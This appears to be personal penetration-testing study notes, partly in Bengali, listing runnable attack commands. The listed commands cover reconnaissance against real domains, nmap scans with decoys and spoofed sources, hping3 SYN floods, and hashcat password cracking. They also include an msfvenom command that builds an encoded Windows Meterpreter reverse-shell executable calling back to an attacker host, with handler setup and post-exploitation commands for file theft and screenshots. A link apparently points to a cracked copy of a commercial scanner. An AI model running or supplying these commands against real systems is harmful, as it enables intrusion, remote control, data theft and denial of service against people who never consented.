osint
whois --version
dnsenum --version
whatweb --version
openssl version
subfinder -version

Kali command:

whois decodeslab.com
dnsenum decodeslab.com
whatweb decodeslab.com
dnsenum --enum -f /usr/share/wordlists/dnsenum.txt owasp.org | tee dns_deep_owasp.txt  (for details)
openssl s_client -connect owasp.org:443


nmap

nmap -sn 192.168.56.0/24
nmap -sn -PR 192.168.56.0/24
sudo nmap -sS -O -sV 192.168.56.102
sudo nmap -sU -p 1-65535 192.168.56.102
nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 10 -oN web_servers.txt
nmap -p 21,22,80,443,3306,3632 -sV --script vuln 192.168.56.102
sudo nmap -D RND:10 192.168.56.102
sudo nmap -S 1.2.3.4 -e eth0 -Pn 192.168.56.102
nmap -sn -sL 192.168.56.0/24 -oG host_list.txt


hping3

sudo hping3 -S --flood -p 80 <target-ip>
sudo hping3 -S -a 10.0.0.99 -p 80 <target-ip>
sudo hping3 --scan 1-1000 -S <target-ip>
sudo hping3 -F -P -R -S -p 80 <target-ip>
sudo hping3 --tcp-timestamp -p 80 <target-ip>

fping
# 3.1 Read hosts from a file
fping -f hosts.txt

# 3.2 Save alive hosts to a file
fping -a -f hosts.txt > alive_hosts.txt

# 3.3 Show only unreachable hosts
fping -u -f hosts.txt

# 3.4 Retry and timeout
fping -r 3 -t 500 -f hosts.txt

# 3.5 Using a specific source IP
fping -S 192.168.1.100 -f hosts.txt


https://github.com/xiv3r/Acunetix-v24.10.241106172#now-login-back-to-application

https://127.0.0.1:3443


Matware

sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=192.168.78.131 LPORT=4444 --platform windows -e x64/zutto_dekiru -i 5 -f exe shellcitw.exe

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.78.131
set LPORT 4444
run

sysinfo
mkdir NSDA
edit FILE4.txt
rm FILE4.txt
download -r <remote_folder_path>
upload -r <local_folder_path> <remote_path>
search -f *.txt -d C:\\
arp
getuid
screenshot
getuid
ping example.com
ipconfig
nslookup
cd ..


Hashcat

sudo apt update && sudo apt install hashcat -y
hashcat -I
hash-identifier
nth -s "your_hash_here"
hashcat --help | grep -i "SHA-256"
echo "YOUR_HASH_HERE" > target_hash.txt
cat target_hash.txt

# rockyou.txt ফাইল আনজিপ করা (যদি না থাকে)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null

# Dictionary Attack চালানো (ধরা যাক হ্যাশ টাইপ MD5, তাই -m 0)
hashcat -m 0 -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt
# Mask Attack ( -a 3 )
hashcat -m 0 -a 3 target_hash.txt ?l?l?l?l?d?d?d?d
hashcat -m 0 target_hash.txt --show

কিবোর্ডের s চাপলে বর্তমান Status (Hash Rate, Time, Progress) দেখাবে।

p চাপলে Pause হবে, r চাপলে Resume হবে, এবং q চাপলে Quit হবে।
# আউটপুট আলাদা লগে সেভ করার কমান্ড
hashcat -m 0 -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt -o cracked_passwords.txt

